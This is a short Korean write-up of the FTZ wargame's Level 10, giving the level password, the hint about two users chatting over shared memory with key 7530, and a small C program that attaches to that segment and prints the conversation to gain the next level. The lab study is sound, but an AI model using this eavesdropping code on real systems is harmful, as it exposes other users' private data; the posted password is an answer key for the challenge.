---
sort: 10
---

# Level 10

```note
id : level10

password : interesting to hack!
```

```bash
[level10@ftz level10]$ cat hint

두명의 사용자가 대화방을 이용하여 비밀스런 대화를 나누고 있다.
그 대화방은 공유 메모리를 이용하여 만들어졌으며, 
key_t의 값은 7530이다. 이를 이용해 두 사람의 대화를 도청하여 
level11의 권한을 얻어라.
```

리눅스의 공유메모리 사용 api를 이용하여 도청하면 된다.<br>
tmp폴더 안에서 코딩을 하면 된다.

```c
#include <sys/shm.h>
#include <sys/ipc.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
        int key = 7530;
        void* memory;
        int id = shmget(key, 0, IPC_CREAT);
        if (id < 0) exit(1);
        memory = shmat(id, NULL, 0);
        if (memory < 0) exit(1);
        puts(memory);

        return 0;
}
```

```tip
## 알게 된 점

공유메모리
```